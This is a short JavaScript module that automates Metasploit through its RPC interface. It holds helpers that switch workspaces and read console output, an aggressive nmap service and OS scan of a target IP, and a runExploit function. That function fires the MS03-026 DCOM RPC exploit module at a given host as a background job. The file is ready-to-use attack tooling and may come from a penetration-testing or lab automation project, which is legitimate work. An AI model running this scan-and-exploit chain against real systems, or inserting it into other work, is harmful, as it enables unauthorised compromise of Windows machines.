msfapi = require('./msfrpc-connection.js');

function getConsoleStatus() {
	return new Promise( (resolve,reject) => {
		msfapi.listMsfConsole()
		.then( (result) => {
			const consoleBusy = result.consoles[0].busy
			resolve(consoleBusy)
		}).catch( (err) => {
			reject(err)
		})
	})
}

function changeWorkspace(workspaceName) {
	return new Promise( (resolve, reject) => {
		msfapi.runMsfCommand('workspace '+workspaceName)
			.then( (result) => {
				resolve(result)
			}).catch( (err) => {
				reject(err)
			})
	})
}

function scanHostsWithNmap(targetIp) {
	return new Promise( (resolve,reject) => {
		msfapi.runMsfCommand('db_nmap -v -sV -sS -T5 -PP -PE -PI -A '+targetIp)
			.then( (result) => {
				resolve(result)
			}).catch( (err) => {
				reject(err)
			})
	})
}

function getMsfCommandDisplay() {
	return new Promise( (resolve, reject) => {
		let consoleId
		msfapi.listMsfConsole()
			.then( (result) => {
				consoleId = result.consoles[0].id
				console.log("running at: ",consoleId);

				msfapi.readMsfConsole(consoleId)
					.then( (result) => {
						console.log(result.data)
						resolve(result)
					}).catch( (err) => {
						reject(err)
				})

			}).catch( (err) => {
				console.log(err);
			})
	})
}

function runExploit(targetIp){
	return new Promise( (resolve,rejct) => {
		msfapi.runMsfCommand('use exploit/windows/dcerpc/ms03_026_dcom\nset RHOST '+targetIp+'\nexploit -j')
			.then( (result) => {
				resolve(result)
			}).catch( (err) => {
				reject(err)
			})
	})
}

// msfapi.destroyMsfConsole('11')

module.exports = {
	changeWorkspace 	: changeWorkspace,
	scanHostsWithNmap 	: scanHostsWithNmap,
	getMsfCommandDisplay: getMsfCommandDisplay,
	getConsoleStatus 	: getConsoleStatus,
	runExploit			: runExploit
}

